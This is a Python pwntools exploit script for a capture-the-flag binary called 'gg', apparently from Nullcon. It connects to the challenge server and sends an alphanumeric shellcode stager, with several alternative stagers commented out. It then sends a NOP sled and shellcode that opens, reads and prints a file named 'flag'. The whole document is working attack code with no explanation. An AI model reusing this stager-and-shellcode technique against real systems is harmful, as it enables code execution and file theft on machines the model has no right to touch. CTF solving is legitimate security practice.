#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template gg
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('gg')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x555555554b94
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
context.terminal = ['gnome-terminal', '-e']
if args.LOCAL:
    io = start()
else:
    io = remote("pwn.ctf.nullcon.net", 4010)
#io.send('VVVYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA')
#io.send("XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V")
#io.send("jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c")
io.send("PTVYhJG00X1A0PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPSZWXEB00")
from time import sleep
sleep(1)

shellcode=""
shellcode+=shellcraft.amd64.pushstr("flag\x00")
shellcode+=shellcraft.amd64.linux.open('rsp', 0, 0)
shellcode+=shellcraft.amd64.linux.read('rax', 'rsp', 100)
shellcode+=shellcraft.amd64.linux.write(1, 'rsp', 100)
shellcode+=shellcraft.amd64.pushstr("\x0a\x0a\x00")
shellcode+=shellcraft.amd64.linux.write(1, 'rsp', 2)

shellcode=asm(shellcode)

io.send("\x90" * 60 + shellcode)

io.interactive()

